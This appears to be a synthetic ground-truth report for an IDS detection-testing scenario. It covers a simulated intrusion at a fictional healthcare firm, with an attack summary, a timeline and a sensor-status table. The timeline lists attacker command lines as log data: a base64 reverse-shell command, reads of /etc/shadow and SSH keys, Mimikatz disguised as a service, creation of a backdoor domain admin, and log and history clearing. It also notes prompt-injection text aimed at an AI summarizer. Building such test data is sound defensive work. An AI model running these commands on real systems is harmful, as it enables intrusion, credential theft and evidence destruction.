# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:12:15 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:18:08 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: Cv003oi4DXkBZRxk95) |
| 2024-03-18 12:23:53 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:30:28 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:30:28 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:31:16 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (420 requests) |
| 2024-03-18 12:45:12 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:48:21 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:52:50 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: Cw6tZ3iJCvmIFFYsVO) |
| 2024-03-18 13:00:05 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: C1k38wjeOGgN1v5oQy) |
| 2024-03-18 13:00:07 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CIDf0uoJhaNK97C3A59) |
| 2024-03-18 13:20:10 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CgPFUdaceuqZ6vyIu4) |
| 2024-03-18 13:20:11 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581448) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:20:12 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: CzRN5LIdcz2A9mLUFm) |
| 2024-03-18 13:20:14 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:54 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584319) - `ip addr show` |
| 2024-03-18 13:39:59 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584364) - `cat /etc/hosts` |
| 2024-03-18 13:40:15 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 585286) - `cat /etc/resolv.conf` |
| 2024-03-18 13:46:57 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 585407) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:47:53 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 585896) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:50:20 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:51:14 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 586084) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:56:16 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 14:00:01 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587146) - `cat /var/www/html/config.php` |
| 2024-03-18 14:00:03 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587265) - `ls -la /root/.ssh` |
| 2024-03-18 14:01:17 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587590) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:14:30 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: Cm3ehy7IoBDKiVKD6k) |
| 2024-03-18 14:14:32 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: Chn03ErTtgqGWYsgc) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:35:04 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962148) - `cat /etc/passwd` |
| 2024-03-18 14:35:11 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962163) - `cat /etc/shadow` |
| 2024-03-18 14:50:29 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:59:04 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 14:59:57 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 14:59:59 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: CdQx8lMbL9xwqbGFD) |
| 2024-03-18 15:07:34 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:14:27 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: C4WON2o2V8WCNC0bQH) |
| 2024-03-18 15:20:19 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x27013e1) |
| 2024-03-18 15:20:20 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6772) - `whoami /all` |
| 2024-03-18 15:20:22 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6776) - `net user /domain` |
| 2024-03-18 15:20:22 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6784) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:20:24 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6816) - `net view /domain` |
| 2024-03-18 15:20:26 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:20:27 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: CAf21golmOj6JX6wwpF) |
| 2024-03-18 15:44:32 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 6828) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:44:37 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:44:39 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 16:00:13 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x5554aa2) |
| 2024-03-18 16:00:15 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 16:00:17 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5668) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 16:00:19 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5672) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:06:34 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:14:47 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5712) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:14:49 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:14:50 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5740) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:14:51 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:19:51 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5772) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:19:53 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5784) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:19:53 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:19:55 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:29:39 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:31:14 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:44:57 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 249 queries, 1274 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=249 emitted=6 filtered=243] |
| 2024-03-18 16:49:54 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 17:00:21 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=182 emitted=18 filtered=164] |
| 2024-03-18 17:01:14 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf885ac0) |
| 2024-03-18 17:01:16 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6172) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:01:17 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6176) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:14:46 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: CaP9ZxLxYcT3tcdBcB) |
| 2024-03-18 17:14:48 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 158521) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:17:18 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 159289) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:19:40 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:22:00 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 159860) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:24:53 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 45.33.32.30:443 (UID: CE5MbORpEh93YSyJdN) |
| 2024-03-18 17:29:48 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:34:53 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:40:21 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608814) - `shred -u /root/.bash_history` |
| 2024-03-18 17:40:33 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982809) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:42:26 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6116) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:42:27 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 6140) - `wevtutil cl Security` |
| 2024-03-18 17:42:30 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:45:15 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:18 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:19 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:50:30 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6156) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:50:33 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:54:55 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:56:27 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:56:50 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 000d3d8b-db18-45c7-acf5-5504107591e6 | ids | delayed: 1 |
| 015e3f41-b178-475d-8910-9fb8491da4bb | ids | delayed: 1 |
| 03d172ca-c7ed-465e-9abb-b3ba6b8d17d6 | ids | delayed: 1 |
| 04809c3d-04d5-402e-a119-78f1b0ce46f0 | ids | delayed: 1 |
| 04edd8ad-7874-4516-9ba2-0e49b85460b8 | ids | delayed: 2 |
| 05f2441d-0578-4a47-a5c6-30b00b47a149 | ids | delayed: 1 |
| 061e1c86-cea3-4166-a0e4-46baf986dc65 | ids | delayed: 2 |
| 085fd54d-ac5f-43c4-a728-13da739da209 | ids | delayed: 1 |
| 0917c489-d9d6-4a0c-b7ea-f02caa1a6416 | ids | delayed: 1 |
| 0995f5f1-5a20-4115-ba2c-a586096ed2bf | ids | delayed: 1 |
| 0af0d3db-454d-4e08-9bfe-d3d400181bb5 | ids | delayed: 1 |
| 0be586bc-aaca-4a14-aefa-ad001a2b7322 | ids | delayed: 1 |
| 13b1daf9-e095-48fc-af0f-ff0cc2efc041 | ids | delayed: 2 |
| 13b7983e-697c-4471-8779-77e87add81ff | ids | delayed: 1 |
| 15d474fb-5639-42e2-90f7-d57e736b5973 | ids | delayed: 2 |
| 164f50d0-9d21-4c38-87ca-2b0eb5623f7c | ids | delayed: 1 |
| 16ee5f2d-abe8-40bc-9e82-5c604918d4ab | ids | delayed: 1 |
| 19914c68-5abc-4ff0-bcf7-1e66081deeb8 | ids | delayed: 2 |
| 19f3a138-e466-4836-9428-0e3c40537f1b | ids | delayed: 1 |
| 1ba7ee2e-cf5c-4d54-83b3-0996bd24c857 | ids | delayed: 1 |
| 1da5d264-23a5-4ffc-8138-700433e921cd | ids | delayed: 1 |
| 1e5326b3-0255-44ce-b305-e521f35d1d0c | ids | visible: 2 |
| 1f6a2fb3-a768-4724-a412-220cb72c4fdf | ids | delayed: 1 |
| 1fb094f0-81de-47eb-b840-180dca07e9c0 | ids | delayed: 1 |
| 20a06ba0-bb2e-4909-862f-065cdccf1f55 | ids | delayed: 1 |
| 20a1b879-f3f0-4537-a785-0dcb60b17c29 | ids | delayed: 1 |
| 211f9937-4ebd-4f1e-a7aa-d812d27f82cf | ids | delayed: 1 |
| 2725fef9-7bb7-4403-955a-474765a504d6 | ids | delayed: 1 |
| 278a7093-0860-405a-a080-45ae6d0c8b20 | ids | delayed: 1 |
| 2b34092c-f2a9-48b9-9a43-06ef208aea40 | ids | delayed: 1 |
| 2beeff56-87b8-4df2-8d4a-c874593d1a9c | ids | delayed: 1 |
| 2d26d0d5-93f9-487f-a077-cbe03b35b879 | ids | delayed: 1 |
| 2e9d5876-eacc-4261-b176-3d952106f1a9 | ids | delayed: 2 |
| 2f16c336-6189-433e-8e79-f7ca8be0506b | ids | delayed: 1 |
| 303111bc-3c9b-4c42-84a6-49a86787704e | ids | delayed: 1 |
| 34ece9e1-ee39-468e-bc01-7b39b4f0be4f | ids | delayed: 1 |
| 353996b0-6aab-4ea5-8293-8468b6e4d2ad | ids | delayed: 1 |
| 3743b6b1-45f1-4a9d-84fa-a3f94f8b4c89 | ids | delayed: 1 |
| 3a734430-ab30-4f12-94cd-bd2838e9e845 | ids | delayed: 1 |
| 3c74da42-a0f1-491e-b838-585841399578 | ids | delayed: 1 |
| 3cf69fe3-989a-4aaa-bda9-6081cf2a03c6 | ids | delayed: 1 |
| 3e09b3fa-2af3-442e-ba1d-317028216da3 | ids | delayed: 1 |
| 3ee61524-e8f2-4535-8bb0-6c381270564b | ids | delayed: 2 |
| 421d4304-bef8-4b0e-a3f4-7ea6af826c56 | ids | delayed: 2 |
| 434c1d7f-c4e1-4878-8b9e-d37dbb386aa4 | ids | delayed: 1 |
| 452d9bae-85a4-43e3-b24a-8950738f30b3 | ids | delayed: 1 |
| 4762cb86-8c0f-4fe3-8e24-44ff84bbf1d7 | ids | delayed: 1 |
| 499fbd3d-a090-4dba-ba2e-2f9fa20e29f1 | ids | delayed: 1 |
| 4b203fba-0174-44f1-add0-d20d4d5aa3f4 | ids | delayed: 1 |
| 4da65dd2-047b-4ea1-82f3-1f4025d652bb | ids | delayed: 2 |
| 4ddc6ca7-ddf3-4184-8ac4-84e63a2d373b | ids | delayed: 2 |
| 503e985c-755c-4d01-afb0-7aa404ddc2a7 | ids | delayed: 1 |
| 53262577-56fd-4280-9b80-b69b66584f93 | ids | delayed: 1 |
| 54cd15d5-81d0-4ba9-8363-4b44394d64b7 | ids | delayed: 2 |
| 565dfe02-0b22-4e0f-80e3-aa51f9b3a45b | ids | delayed: 1 |
| 57e6252a-0617-4e4b-9b53-5e120f0daa25 | ids | delayed: 2 |
| 5a796d28-6a07-488f-ad62-cef4d1f4cf47 | ids | delayed: 1 |
| 5b17b98d-2e16-427c-ab67-c156d33ecd49 | ids | delayed: 2 |
| 5cdac87b-c84e-40c1-a988-0477c32b5f33 | ids | delayed: 1 |
| 5fc92536-6d52-498e-ae1f-6704785b80d4 | ids | delayed: 1 |
| 626d27a5-8e22-452b-b6fb-b766e047ebad | ids | delayed: 1 |
| 63a4c808-e120-410a-850c-fadfc4e5553e | ids | delayed: 1 |
| 63ccd136-3736-47f0-84ea-09b6ba399bed | ids | delayed: 2 |
| 651c9dc9-15ad-474f-ae60-cb06f6e90184 | ids | delayed: 1 |
| 65938ca8-82ff-4e37-bf5b-54cd29ffa51f | ids | delayed: 1 |
| 6931d9b5-6d88-46c5-af74-f84e390a60c8 | ids | delayed: 1 |
| 6af6540d-4bf5-4987-bfbc-b5c72f851c8b | ids | visible: 1 |
| 6c013b3e-2441-4d42-b593-a9af8d532404 | ids | delayed: 2 |
| 6c4a3851-4803-4413-8c40-0eb133630485 | ids | delayed: 1 |
| 6c548242-c6a7-4cc0-8c5d-27c8cfec2212 | ids | delayed: 1 |
| 6dc1d271-3ade-497b-bbdc-fed772bfcae1 | ids | delayed: 1 |
| 6eba267e-faa7-430f-9680-d4b7b7df1740 | ids | delayed: 1 |
| 6fe43c12-0e9b-44ac-81d3-476d091d9fb7 | ids | delayed: 2 |
| 71a31a6d-be41-426a-a62b-53435294181a | ids | delayed: 1 |
| 71d08c45-438e-467c-947c-4346f6c6c95d | ids | delayed: 2 |
| 71da8625-6b0f-4cdf-b74a-bd970c1bf3f0 | ids | delayed: 1 |
| 760daee5-6dce-44c9-9c08-3d6a566bd9f6 | ids | delayed: 1 |
| 76eb36de-7997-444d-b058-36477b30f497 | ids | delayed: 1 |
| 78ce9724-a0cf-4859-bfb1-330b5e8b7aaa | ids | delayed: 1 |
| 7aa1139e-c9a3-463f-94a5-91d89301ac1f | ids | delayed: 1 |
| 7b6997e2-467c-4c4c-971e-5d315357324f | ids | delayed: 1 |
| 7bdc03aa-3e9e-4e25-9b96-86f55b7a2642 | ids | delayed: 1 |
| 7bf029d3-b519-4df0-a31a-44dfe8d5c6d4 | ids | delayed: 2 |
| 7cd757e0-ee94-485a-8097-6787c149ff00 | ids | delayed: 1 |
| 7e55a0bd-bcb8-410f-97ca-46f04d1d5747 | ids | delayed: 1 |
| 7e90fec1-d41b-450c-a5bb-4a51f499e983 | ids | delayed: 2 |
| 7f9dc196-d35f-4b27-a751-dac5b2e9e42b | ids | delayed: 1 |
| 81e33ca1-7ff5-4ba3-9fae-ef8ae1d71180 | ids | delayed: 2 |
| 81fa8d97-5e9c-4aad-beef-3d28961c8b5c | ids | delayed: 1 |
| 8342a837-a1c8-4046-87fb-6b26faff125f | ids | delayed: 1 |
| 856ddf60-bc3d-44a8-9379-4c930013dc7d | ids | delayed: 2 |
| 857b84c4-d777-4005-a018-044a3a3b6e17 | ids | delayed: 1 |
| 8795b1e5-617c-434f-8ae1-859f8d0bfe32 | ids | delayed: 2 |
| 88537f0f-9dd9-4e3f-8e6a-03fb84201b3d | ids | delayed: 1 |
| 8b6208ba-6643-4eed-80cf-9c4dd6fb3de5 | ids | delayed: 1 |
| 8d586a73-c476-4118-8c44-d82b713d92ad | ids | delayed: 2 |
| 8e4ef772-41d7-4e91-807a-40bd227871ac | ids | visible: 1 |
| 911a997c-d652-49a6-baac-6807e5c91d7b | ids | delayed: 1 |
| 93bfcc37-bca6-4988-a2d0-6a54e1dbb002 | ids | delayed: 1 |
| 93e5bb0d-6746-44d5-a4da-a8579cc7ac61 | ids | delayed: 1 |
| 94e311ee-fb3d-44ff-9582-61f7065be3d7 | ids | delayed: 1 |
| 99baf161-e29e-44c8-8c36-94257d3d1073 | ids | delayed: 1 |
| 9b85da62-e9d4-432b-a41d-6c1322bf2839 | ids | delayed: 1 |
| 9d54c3f0-b7a9-4eae-8e3e-46ce0d342f8d | ids | delayed: 1 |
| 9ffad89d-9d9d-4282-944b-1f6772e30445 | ids | delayed: 1 |
| a26278cc-b615-4420-8e45-204466181608 | ids | delayed: 2 |
| a3341c40-ea43-4a50-b9e4-6d7c0107b91d | ids | delayed: 1 |
